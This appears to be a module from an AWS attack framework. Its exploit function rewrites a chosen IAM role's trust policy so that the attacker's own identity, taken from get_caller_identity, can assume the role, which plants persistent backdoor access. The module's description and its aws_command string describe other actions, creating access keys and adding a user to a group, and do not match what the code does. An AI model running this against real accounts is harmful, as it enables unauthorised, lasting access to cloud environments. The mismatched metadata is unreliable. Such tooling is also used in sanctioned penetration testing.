from core.createSession.giveMeClient import giveMeClient

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "iam",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"ROLE": {
		"value": "",
		"required": "true",
        "description":"The role to modify the policy to"
	},
	"POLICY-DOCUMENT": {
		"value": '',
		"required": "false",
        "description":"The Assume Policy to add to the role as string. If not set, it will add the attackerarn as the only identity which can assume the role."
	}
}
description = "Create a 2nd access key to a user. To do this, the user needs to have only one access key. If the user has 2 access keys and OVERRIDE-OLDEST-ACCESS-KEY is set to true, the oldest created access key will be deleted and a new one will be created."

aws_command = "aws ec2 add-user-to-group --user-name {} --group {} --region {} --profile {}"

def exploit(all_sessions, cred_prof, useragent, web_proxies, workspace):
	role = variables['ROLE']['value']
	policydoc = variables['POLICY-DOCUMENT']['value']

	if policydoc == '':
		stsProfile = giveMeClient(
			all_sessions,
			cred_prof,
			useragent,
			web_proxies,
			"sts"
		)
		try:
			attackerARN = stsProfile.get_caller_identity()['Arn']
			policydoc = f'{{"Version": "2012-10-17", "Statement": [{{"Sid": "Statement1", "Effect": "Allow","Principal": {{"AWS": [{attackerARN}]}},"Action": "sts:AssumeRole"}}]}}'

		except Exception as e:
			return {"error": f"Error getting the attacker ARN: {str(e)}"}

	iamProfile = giveMeClient(
		all_sessions,
		cred_prof,
		useragent,
		web_proxies,
		"iam"
	)

	try:

		iamProfile.update_assume_role_policy(
			RoleName=role,
			PolicyDocument=policydoc
		)
		return {
			"AdditionStatus": f"Role {role} policy modified"
		}
	except Exception as e:
		return {
			"error": str(e)
		}, 500


